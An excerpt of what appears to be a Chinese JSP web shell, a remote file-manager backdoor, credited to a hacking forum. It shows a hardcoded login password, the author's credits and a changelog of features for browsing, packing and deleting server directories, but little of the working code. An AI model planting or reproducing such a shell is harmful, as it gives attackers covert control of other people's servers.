...
<%!private final static int languageNo = 0; //语言版本，0 : 中文； 1：英文
	String password = "diroverflow";//登录密码
	String[] authorInfo = { "作者charles QQ 77707777 ", " " };
...
<%}%>
	...
	<body>
		...
		<DIV id="tabcontentcontainer">
			...
			<div id="menu4" class="tabcontent">
				<ul>
					...
					<li>版权说明</li>
						<ol>
							<li>本程序版权归原作者所有,X-files仅对程序局部修改</li>
							<li>联系X-files:<a href="http://www.google.com" target="_blank">http://www.google.com</a> <a href="http://www.google.cn" target="_blank">http://www.google.cn</a></li>
						</ol>
					<li>更新记录</li>
						<ol>
							<li>2008.05.16&nbsp;删除循环获取系统相关属性功能,原因见bug - X-files</li>
							<li>2008.05.16&nbsp;增加对指定目录跳转功能,修改需在文件中指定文件名的操作,自动获取 - X-files</li>
							<li>2008.05.15&nbsp;增加对浏览目录指定打包功能,增加删除目录功能 - X-files</li>
							<li>2007.12.27&nbsp;增加登录验证功能 - X-files</li>
							<li>2007.12.26&nbsp;修改程序部分不推荐使用的方法,增加系统基本属性查看功能,部分代码重写 - X-files</li>
		...
		<div align="center" Style="margin: 5px;">
			<a href="http://bbs.sy866.net" target="_blank">http://bbs.sy866.net</a> By 刺客安全网
		</div>
	</body>
</html>
